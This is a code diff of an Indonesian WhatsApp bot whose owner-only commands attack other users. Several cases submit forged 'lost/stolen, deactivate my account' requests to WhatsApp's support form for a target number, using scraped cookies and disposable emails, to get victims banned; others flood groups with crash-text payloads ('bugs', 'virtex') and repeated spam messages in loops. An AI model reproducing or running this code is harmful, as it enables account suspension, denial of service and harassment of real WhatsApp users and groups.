+  data: form,
+  headers: {
+    cookie
+  }
+})
+haikal.sendMessage(from, { text: util.format(res.data)}, {quoted:m})
+break
 //=================================================
-case 'verif@': case 'kenon': {
+case 'verif@': {
 if (!isCreator) return
 if (m.quoted || q) {
 var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
@@ -1679,15 +1311,15 @@ form.append("phone_number", `+${targetnya}`,)
 form.append("email", email.data[0])
 form.append("email_confirm", email.data[0])
 form.append("platform", "ANDROID")
-form.append("your_message", `Perdido/roubado: desative minha conta`)
+form.append("your_message", "Perdido/roubado: desative minha conta")
 form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
-form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1007965968")
+form.append("__rev", "1007735016")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -1778,10 +1410,10 @@ form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
-form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1007965968")
+form.append("__rev", "1007735016")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -1809,13 +1441,13 @@ Berikut yang mungkin terjadi jika Anda menggunakannya:
 
 Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.
 
-Akun mungkin akan diblokir karena Usersan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.
+Akun mungkin akan diblokir karena usersan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.
 
 Berikut adalah ketentuan layanan WhatsApp:
 
 Ketentuan Layanan WhatsApp
 
-1. Usersan Aplikasi
+1. usersan Aplikasi
 
 Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.
 
@@ -1827,10 +1459,10 @@ Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terk
 WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 
 
 4. Pembatasan Tanggung Jawab 
-WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh Usersan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 
+WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh usersan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 
 
 5. Perubahan Ketentuan Layanan 
-WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan Usersan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
+WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan usersan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
 } else if (payload.includes(`"payload":false`)) {
 reply(`##- WhatsApp Support -##
 
@@ -1851,7 +1483,7 @@ var targetnya = tosend.split('@')[0]
 try {
 var axioss = require('axios')
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
 let cookie = ntah.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
 let $ = cheerio.load(ntah.data)
@@ -1872,10 +1504,10 @@ form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
-form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1007965968")
+form.append("__rev", "1007735016")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -1897,7 +1529,7 @@ Halo,
 
 Terima kasih telah menghubungi kami.
 
-Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai Users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
+Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
 
 Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
 
@@ -1924,7 +1556,7 @@ var targetnya = tosend.split('@')[0]
 try {
 var axioss = require('axios')
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
 let cookie = ntah.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
 let $ = cheerio.load(ntah.data)
@@ -1946,10 +1578,10 @@ form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
-form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1007965968")
+form.append("__rev", "1007735016")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -1971,7 +1603,7 @@ Halo,
 
 Terima kasih telah menghubungi kami.
 
-Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai Users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
+Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
 
 Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
 
@@ -1998,7 +1630,7 @@ var targetnya = tosend.split('@')[0]
 try {
 var axioss = require('axios')
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
 let cookie = ntah.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
 let $ = cheerio.load(ntah.data)
@@ -2019,10 +1651,10 @@ form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
-form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1007965968")
+form.append("__rev", "1007735016")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -2044,7 +1676,7 @@ Halo,
 
 Terima kasih telah menghubungi kami.
 
-Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai Users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
+Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
 
 Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
 
@@ -2071,7 +1703,7 @@ var targetnya = tosend.split('@')[0]
 try {
 var axioss = require('axios')
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
 let cookie = ntah.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
 let $ = cheerio.load(ntah.data)
@@ -2092,10 +1724,10 @@ form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
-form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1007965968")
+form.append("__rev", "1007735016")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -2117,7 +1749,7 @@ Halo,
 
 Terima kasih telah menghubungi kami.
 
-Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai Users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
+Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
 
 Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
 
@@ -2144,7 +1776,7 @@ var targetnya = tosend.split('@')[0]
 try {
 var axioss = require('axios')
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
 let cookie = ntah.headers["set-cookie"].join("; ")
 const cheerio = require('cheerio');
 let $ = cheerio.load(ntah.data)
@@ -2164,10 +1796,10 @@ form.append("__user", "0")
 form.append("__a", "1")
 form.append("__csr", "")
 form.append("__req", "8")
-form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1007965968")
+form.append("__rev", "1007735016")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -2189,7 +1821,7 @@ Halo,
 
 Terima kasih telah menghubungi kami.
 
-Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai Users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
+Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai users. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
 
 Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
 
@@ -2207,7 +1839,7 @@ Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui 
 break
 //=================================================
 case 'openai':
-if (!isCreator) return m.reply('*Special Premium*') 
+if (!isCreator) return m.reply(`*special Premium*`) 
 await loading()
  try {
 if (global.keyopenai === '') return reply("Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file config.js\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys");
@@ -2248,9 +1880,9 @@ case 'bug': case 'apa': case 'kenapa': case 'oke': case 'bug': case 'apa':{
   break
   //=================================================
 case 'docugc': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-if (args.length < 1) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
+if (args.length < 1) return m.reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
 bnnd = text.split("|")[0]+'@g.us'
 jumlah = "15"
 for (let i = 0; i < jumlah; i++) {
@@ -2271,14 +1903,14 @@ var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 }), { userJid: from, quoted:kalgans})
 haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${bnnd} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${bnnd} Please Wait 3 Minutes Yesh*`)
 }
 break
 //=================================================//
 case 'troligc': {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-if (!args[0]) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
+if (!args[0]) return m.reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
 bnnd = text.split("|")[0]+'@g.us'
 jumlah = "15"
 for (let i = 0; i < jumlah; i++) {
@@ -2295,654 +1927,648 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "sellerJid": "2347082252014@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
-}), { userJid: from, quoted : m})
+}), { userJid: from, quoted : kalgans})
 haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${bnnd} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${bnnd} Please Wait 3 Minutes Yesh*`)
 }
 break
 //=================================================//
 case 'gasfullgc' : {
- if (!isCreator) return m.reply('*Special Premium*')
+ if (!isCreator) return m.reply(`*special Premium*`)
  await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let rumgc = await haikal.groupAcceptInvite(result)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+Pe = text.split("|")[0]+'@g.us'
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
-haikal.sendMessage(rumgc, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
+haikal.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${rumgc} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 // BUG OWNER
  case 'santetgc' : {
- if (!isCreator) return m.reply('*Special Premium*')
+ if (!isCreator) return m.reply(`*special Premium*`)
  await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let rumgc = await haikal.groupAcceptInvite(result)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+Pe = text.split("|")[0]+'@g.us'
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
 await sleep(2000)
 }
-m.reply(`*SUCCESSFULLY SENT BUGS Ke ${rumgc} Please wait 3 Minutes h*`)
+m.reply(`*successful sending bugs ${Pe} Please Wait 3 Minutes Yesh*`)
 break
 //=================================================//
 case 'unlidelaygc' :  {
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply(`*special Premium*`)
 await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let rumgc = await haikal.groupAcceptInvite(result)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+Pe = text.split("|")[0]+'@g.us'
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
-haikal.sendMessage(rumgc, {text: virtex7}, {quoted:kalgans})
+haikal.sendMessage(Pe, {text: virtex7}, {quoted:kalgans})
 await sleep(2000)
